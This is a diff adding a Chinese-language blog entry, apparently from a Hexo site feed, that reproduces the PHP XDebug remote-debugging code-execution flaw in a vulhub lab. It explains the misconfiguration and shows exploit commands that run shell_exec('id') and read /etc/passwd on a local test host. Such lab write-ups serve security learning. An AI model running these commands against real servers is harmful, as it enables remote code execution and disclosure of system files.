@@ -4,6 +4,39 @@
   
     
     <entry>
+      <title>php-xDebug远程调试漏洞(代码执行)</title>
+      <link href="/2022/05/06/php-xDebug/"/>
+      <url>/2022/05/06/php-xDebug/</url>
+      
+        <content type="html"><![CDATA[<h1 id="XDebug远程调试漏洞"><a href="#XDebug远程调试漏洞" class="headerlink" title="XDebug远程调试漏洞"></a>XDebug远程调试漏洞</h1><h2 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h2><blockquote><p>Xdebug是一个开放源代码的PHP程序调试器(即一个Debug工具)，可以用来跟踪，调试和分析PHP程序的运行状况。</p><p>如果目标开启了远程调试模式，并设置<code>remote_connect_back = 1</code></p></blockquote><pre><code>xdebug.remote_connect_back = 1xdebug.remote_enable = 1</code></pre><blockquote><p>这个配置下，我们访问<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>，目标服务器的XDebug将会连接访问者的IP（或<code>X-Forwarded-For</code>头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/php/xdebug-rcedocker-compose up -d</code></pre><p>启动完成后打开<code>http://192.168.3.151:8080</code>发现主页是phpinfo</p><p>查看xdebug配置</p><p><img src="/2022/05/06/php-xDebug/image-20220506093036691.png" alt="image-20220506093036691"></p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>使用官方的<a href="https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py">漏洞复现脚本</a></p><pre class=" language-Linux"><code class="language-Linux">python3 exp.py -t http://192.168.3.151:8080/index.php -c 'shell_exec('id');'</code></pre><p><img src="/2022/05/06/php-xDebug/image-20220506093943235.png" alt="image-20220506093943235"></p><p>看一下<code>/etc/passwd</code></p><pre class=" language-Linux"><code class="language-Linux">python3 exp.py -t http://192.168.3.151:8080/index.php -c 'shell_exec("cat /etc/passwd");'</code></pre><p><img src="/2022/05/06/php-xDebug/image-20220506094052923.png" alt="image-20220506094052923"></p><p>结束！！！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> vulhub </tag>
+            
+            <tag> PHP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>PHP文件包含漏洞(利用phpinfo)</title>
       <link href="/2022/05/06/php-inclusion/"/>
       <url>/2022/05/06/php-inclusion/</url>
